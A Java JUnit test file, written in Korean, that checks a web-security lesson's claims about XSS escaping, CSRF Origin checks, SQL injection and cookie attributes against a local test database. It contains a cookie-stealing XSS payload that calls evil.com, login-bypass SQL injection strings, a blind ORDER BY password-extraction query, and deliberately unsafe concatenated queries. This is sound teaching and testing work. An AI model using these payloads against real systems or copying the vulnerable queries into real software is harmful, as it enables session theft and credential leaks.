package lab.devlessons.websecurity;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;
import lab.devlessons.support.CiOutput;
import lab.devlessons.support.MiniWeb;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.ResponseCookie;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.util.HtmlUtils;
import org.testcontainers.containers.PostgreSQLContainer;

/**
 * 레슨 "웹 보안 기초"의 주장을 검증한다.
 * 브라우저가 스크립트를 실행하는 모습은 테스트로 돌릴 수 없어서, 서버가 돌려준 HTML과 헤더를 본다.
 * SQL 인젝션은 Testcontainers의 PostgreSQL 16에 JDBC로 쿼리한다.
 */
class WebSecurityTest {

    static final String LESSON = "web-security-basics";
    static final String ATTACK = "맛있어요<script>fetch(\"https://evil.com/?c=\"+document.cookie)</script>";
    static final AtomicInteger ORDERS = new AtomicInteger();

    static PostgreSQLContainer<?> postgres;
    static Connection db;
    final HttpClient http = HttpClient.newHttpClient();

    @BeforeAll
    static void startDb() throws Exception {
        postgres = new PostgreSQLContainer<>("postgres:16-alpine");
        postgres.start();
        db = DriverManager.getConnection(postgres.getJdbcUrl(), postgres.getUsername(), postgres.getPassword());
        try (Statement st = db.createStatement()) {
            st.execute("create table member (id int primary key, email text, password text)");
            st.execute("insert into member values (1, 'admin@shop.com', 'a9x!Kq2'), (2, 'kim@shop.com', 'kimpw')");
            st.execute("create table product (id int primary key, name text, price int)");
            st.execute("insert into product values (1, '라떼', 5000), (2, '커피', 4500), (3, '케이크', 7000)");
        }
    }

    @AfterAll
    static void stopDb() throws Exception {
        db.close();
        postgres.stop();
    }

    // ── 질문 1: XSS ──

    @RestController
    static class ReviewApi {
        @GetMapping(value = "/reviews/1", produces = "text/html;charset=UTF-8")
        String raw() {
            return "<p>" + ATTACK + "</p>";
        }

        @GetMapping(value = "/reviews/1/safe", produces = "text/html;charset=UTF-8")
        String safe() {
            return "<p>" + HtmlUtils.htmlEscape(ATTACK) + "</p>";
        }
    }

    @Test
    @DisplayName("사용자 글을 그대로 넣은 HTML에는 <script>가 그대로 있고, HtmlUtils.htmlEscape를 쓰면 &lt;script&gt;가 된다")
    void xssEscaping() throws Exception {
        try (MiniWeb web = MiniWeb.start(ReviewApi.class)) {
            String raw = web.get("/reviews/1").body();
            String safe = web.get("/reviews/1/safe").body();

            assertThat(raw).contains("<script>");
            assertThat(safe).doesNotContain("<script>").contains("&lt;script&gt;");
            CiOutput.record(LESSON, "xss", "[그대로 넣은 응답]\n" + raw + "\n\n[htmlEscape로 바꿔 쓴 응답]\n" + safe);
        }
    }

    // ── 질문 2: CSRF ──

    @RestController
    static class OrderApi {
        @PostMapping({"/orders", "/safe/orders"})
        String order(@CookieValue(name = "SESSION", required = false) String session,
                     @RequestParam long productId) {
            if (!"kim-session".equals(session)) {
                return "로그인 필요";
            }
            return "kim의 주문 " + ORDERS.incrementAndGet() + "번 생성 (상품 " + productId + ")";
        }
    }

    /** 상태를 바꾸는 요청의 Origin이 우리 출처가 아니면 403 (레슨의 originCheck) */
    @Configuration(proxyBeanMethods = false)
    static class OriginCheck implements WebMvcConfigurer {
        @Override
        public void addInterceptors(InterceptorRegistry registry) {
            registry.addInterceptor(new HandlerInterceptor() {
                @Override
                public boolean preHandle(HttpServletRequest req, HttpServletResponse res, Object handler)
                        throws Exception {
                    String origin = req.getHeader("Origin");
                    if (!"GET".equals(req.getMethod()) && origin != null && !origin.equals("https://shop.com")) {
                        res.sendError(403, "다른 출처의 요청");
                        return false;
                    }
                    return true;
                }
            }).addPathPatterns("/safe/**");
        }
    }

    HttpResponse<String> crossSitePost(MiniWeb web, String path) throws Exception {
        return http.send(HttpRequest.newBuilder(URI.create("http://localhost:" + web.port() + path))
                .header("Origin", "https://evil.com")
                .header("Cookie", "SESSION=kim-session")
                .header("Content-Type", "application/x-www-form-urlencoded")
                .POST(HttpRequest.BodyPublishers.ofString("productId=7")).build(), HttpResponse.BodyHandlers.ofString());
    }

    @Test
    @DisplayName("세션 쿠키와 다른 출처의 Origin을 실은 폼 POST는 보호가 없으면 처리되고, Origin을 확인하면 403이다")
    void crossSiteRequest() throws Exception {
        ORDERS.set(0);
        try (MiniWeb web = MiniWeb.start(OrderApi.class, OriginCheck.class)) {
            HttpResponse<String> open = crossSitePost(web, "/orders");
            int afterOpen = ORDERS.get();
            HttpResponse<String> checked = crossSitePost(web, "/safe/orders");
            int afterChecked = ORDERS.get();

            assertThat(open.statusCode()).isEqualTo(200);
            assertThat(afterOpen).isEqualTo(1);
            assertThat(checked.statusCode()).isEqualTo(403);
            assertThat(afterChecked).isEqualTo(1);
            CiOutput.record(LESSON, "csrf", "[보호 없음] POST /orders (Origin: https://evil.com, Cookie: SESSION=...)\n"
                    + open.statusCode() + " " + open.body() + "\n주문 수: " + afterOpen
                    + "\n\n[Origin 확인] POST /safe/orders (같은 요청)\n" + checked.statusCode()
                    + "\n주문 수: " + afterChecked + " (늘지 않음)");
        }
    }

    // ── 질문 3: SQL 인젝션 ──

    static List<String> concatLogin(String email, String pw) throws Exception {
        String sql = "SELECT * FROM member "
                + "WHERE email = '" + email + "' "
                + "AND password = '" + pw + "'";
        List<String> rows = new ArrayList<>();
        try (Statement st = db.createStatement(); ResultSet rs = st.executeQuery(sql)) {
            while (rs.next()) {
                rows.add(rs.getString("email"));
            }
        }
        return rows;
    }

    static List<String> preparedLogin(String email, String pw) throws Exception {
        String sql = "SELECT * FROM member WHERE email = ? AND password = ?";
        List<String> rows = new ArrayList<>();
        try (PreparedStatement ps = db.prepareStatement(sql)) {
            ps.setString(1, email);
            ps.setString(2, pw);
            try (ResultSet rs = ps.executeQuery()) {
                while (rs.next()) {
                    rows.add(rs.getString("email"));
                }
            }
        }
        return rows;
    }

    @Test
    @DisplayName("이어 붙인 로그인 쿼리에 admin@shop.com' --를 넣으면 1행, ' OR '1'='1은 모든 행이 나오고, PreparedStatement는 0행이다")
    void sqlInjection() throws Exception {
        List<String> comment = concatLogin("admin@shop.com' --", "아무거나");
        List<String> orTrue = concatLogin("x", "' OR '1'='1");
        List<String> safeComment = preparedLogin("admin@shop.com' --", "아무거나");
        List<String> safeOr = preparedLogin("x", "' OR '1'='1");

        assertThat(comment).containsExactly("admin@shop.com");
        assertThat(orTrue).hasSize(2);
        assertThat(safeComment).isEmpty();
        assertThat(safeOr).isEmpty();
        CiOutput.record(LESSON, "sqli", String.join("\n",
                "[문자열로 이어 붙인 쿼리]",
                "email=admin@shop.com' --, pw=아무거나 → " + comment,
                "email=x, pw=' OR '1'='1         → " + orTrue,
                "",
                "[PreparedStatement와 ?]",
                "email=admin@shop.com' --, pw=아무거나 → " + safeComment,
                "email=x, pw=' OR '1'='1         → " + safeOr));
    }

    static final Set<String> SORTABLE = Set.of("price", "name");

    static List<String> products(String sort, boolean whitelist) throws Exception {
        if (whitelist && !SORTABLE.contains(sort)) {
            throw new IllegalArgumentException("정렬할 수 없는 칸: " + sort);
        }
        String sql = "SELECT name FROM product ORDER BY " + sort;
        List<String> names = new ArrayList<>();
        try (Statement st = db.createStatement(); ResultSet rs = st.executeQuery(sql)) {
            while (rs.next()) {
                names.add(rs.getString(1));
            }
        }
        return names;
    }

    @Test
    @DisplayName("ORDER BY에 이어 붙인 값은 SQL 식으로 실행되어 다른 테이블의 비밀을 순서로 흘리고, 허락 목록은 그 값을 거부한다")
    void orderByInjection() throws Exception {
        String byPrice = "price";
        String guessA = "(CASE WHEN (SELECT password FROM member WHERE id = 1) LIKE 'a%' THEN price ELSE -price END)";
        String guessB = "(CASE WHEN (SELECT password FROM member WHERE id = 1) LIKE 'b%' THEN price ELSE -price END)";
        List<String> normal = products(byPrice, false);
        List<String> a = products(guessA, false);
        List<String> b = products(guessB, false);

        assertThat(a).isEqualTo(normal);
        assertThat(b).isNotEqualTo(normal);
        assertThatThrownBy(() -> products(guessA, true)).isInstanceOf(IllegalArgumentException.class);
        CiOutput.record(LESSON, "order-by", String.join("\n",
                "sort=price → " + normal,
                "sort=(admin 비밀번호가 a로 시작하면 price, 아니면 -price) → " + a + "  ← 가격순과 같음: a로 시작",
                "sort=(… b로 시작하면 …) → " + b + "  ← 반대 순서: b로 시작하지 않음",
                "허락 목록을 쓰면 → IllegalArgumentException: 정렬할 수 없는 칸"));
    }

    // ── 질문 4: 쿠키 속성 ──

    @Test
    @DisplayName("ResponseCookie로 만든 Set-Cookie에 HttpOnly, Secure, SameSite=Lax가 붙는다")
    void cookieAttributes() {
        ResponseCookie c = ResponseCookie.from("SESSION", "kim-session")
                .httpOnly(true)
                .secure(true)
                .sameSite("Lax")
                .path("/")
                .maxAge(Duration.ofMinutes(30))
                .build();
        String header = c.toString();

        assertThat(header).contains("HttpOnly").contains("Secure").contains("SameSite=Lax");
        CiOutput.record(LESSON, "cookie", "Set-Cookie: " + header);
    }
}
